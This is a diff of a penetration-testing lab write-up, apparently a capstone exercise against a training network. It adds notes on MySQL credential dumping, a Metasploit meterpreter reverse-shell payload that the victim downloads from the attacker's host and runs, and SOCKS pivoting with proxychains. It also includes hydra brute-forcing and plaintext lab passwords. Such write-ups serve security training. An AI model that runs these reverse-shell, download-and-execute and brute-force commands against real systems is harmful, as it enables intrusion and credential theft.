@@ -43,7 +43,7 @@ No other ports found.
 <pre><code><strong>nmap -sV -sT -O -p 1-65535 $WEB
 </strong></code></pre>
 
-<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (4) (2).png" alt=""><figcaption></figcaption></figure>
 
 ### Web - HTTP port 80
 
@@ -65,7 +65,7 @@ Looking for php files we found the info file which can be used to find info abou
 dirb http://$WEB:80 /usr/share/wordlists/dirb/big.txt -X .php
 ```
 
-<figure><img src="../../.gitbook/assets/image (11) (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (11) (3) (3).png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src="../../.gitbook/assets/image (37) (3).png" alt=""><figcaption></figcaption></figure>
 
@@ -206,7 +206,7 @@ john --wordlist=Capstone_Challenge_Resources/password_base_list.txt --rules=Caps
 hydra -L users.txt -P mangled-passwords.txt smtp://$WebMail -V -o smtp-results.txt
 ```
 
-<figure><img src="../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (11) (3).png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -525,6 +525,26 @@ Password: 123
 
 <figure><img src="../../.gitbook/assets/image (37) (1).png" alt=""><figcaption></figcaption></figure>
 
+### MySQL
+
+**Victim**
+
+```
+mysql -u vpn -p
+Enter password: Password1!
+```
+
+**mysql**
+
+```
+show databases; 
+use vpn 
+show tables; 
+select * from users;
+```
+
+### ![](<../../.gitbook/assets/image (11).png>)
+
 ### Pivot
 
 **Kali**
@@ -557,6 +577,61 @@ vi /etc/proxychains.conf
 ```
 socks4 	127.0.0.1 9050
 ```
+
+### MSFVenom
+
+not done
+
+**Kali**
+
+```
+msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=$KALI LPORT=8080 -f elf > reverse-8080.elf
+```
+
+**Kali(msfvenom)**
+
+```
+msfconsole -q 
+use exploit/multi/handler
+set payload linux/x64/meterpreter_reverse_tcp
+set LHOST $KALI
+set LPORT 8080
+run
+```
+
+**Kali**
+
+```
+python2 -m SimpleHTTPServer 81
+```
+
+**Victim**
+
+```
+cd /tmp/
+wget http://$KALI:81/reverse-8080.elf
+chmod +x reverse-8080.elf
+./reverse-8080.elf
+```
+
+**Kali(meterpreter)**
+
+```
+background
+use auxiliary/server/socks_proxy
+set srvport 9050
+set srvhost 0.0.0.0
+set version 4a
+run
+
+use post/multi/manage/autoroute
+set session $sessionID
+set subnet 10.200.X.0
+
+run autoroute -p
+```
+
+####
 
 #### Scanning other hosts
 
@@ -684,6 +759,14 @@ nmap -sV -sT -O -p 1-65535 10.200.89.21
 
 <figure><img src="../../.gitbook/assets/image (82).png" alt=""><figcaption></figcaption></figure>
 
+### Pivot
+
+```
+proxychains remmina 
+```
+
+<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+
 ## 10.200.89.22
 
 scanned from VPN server after rooting
@@ -722,7 +805,7 @@ scanned from VPN server after rooting
 nmap -sV -sT -O -p 1-65535 10.200.89.51
 ```
 
-nothing found? or issue with server. will try again
+All ports filtered or issue with server.
 
 ## 10.200.89.52
 
@@ -732,6 +815,8 @@ scanned from VPN server after rooting
 nmap -sV -sT -O -p 1-65535 10.200.89.52
 ```
 
+All ports filtered or issue with server.
+
 ## 10.200.89.61
 
 scanned from VPN server after rooting
@@ -739,6 +824,8 @@ scanned from VPN server after rooting
 ```
 nmap -sV -sT -O -p 1-65535 10.200.89.61
 ```
+
+All ports filtered or issue with server.&#x20;
 
 ## 10.200.89.100
 
@@ -783,6 +870,12 @@ Domain: corp.thereserve.loc
 #SMTP creds found for WebMail
 [25][smtp] host: 10.200.119.11   login: laura.wood@corp.thereserve.loc   password: Password1@
 [25][smtp] host: 10.200.119.11   login: mohammad.ahmed@corp.thereserve.loc   password: Password1!
+
+#MySQL creds found for VPN
+| USERNAME   | PASSWORD      |
++------------+---------------+
+| test       | test          |
+| lisa.moore | Scientist2006
 
 ```
 
